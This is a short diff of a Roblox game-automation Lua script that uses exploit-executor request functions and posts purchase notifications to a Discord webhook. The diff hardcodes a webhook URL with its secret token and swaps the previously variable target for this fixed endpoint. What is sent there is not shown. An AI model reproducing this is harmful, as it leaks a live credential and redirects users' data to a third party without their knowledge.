@@ -1,3 +1,4 @@
+UrlWebhook = 'https://discord.com/api/webhooks/967820762734030899/lPujX41Md70Per8IZyU6jwMFHpvl-_5MFqQSzguUMGYZep1a_t0HHYzTFTJ8gPBolGrP'
 local api = {
     'https://raw.githubusercontent.com/ZPSXHUB/TG/main/SaveToConfig.lua',
 }
@@ -106,13 +107,13 @@ function returnwebhook()
    local Data = game:GetService("HttpService"):JSONEncode(Webhook)
    local Head = {["content-type"] = "application/json"}
    Send = http_request or request or HttpPost or syn.request
-   local sendhook = {Url = WebhookLink, Body = Data, Method = "POST", Headers = Head}
+   local sendhook = {Url = UrlWebhook, Body = Data, Method = "POST", Headers = Head}
    Send(sendhook)
 end
 spawn(function()
  while wait() do
     if BuyRandom() == "[You must wait 01:59 hours to buy another random fruit.]" or BuyRandom() == 1 and InSuccess() then
-wait(60)
+      wait(60)
       returnwebhook()
     end
  end
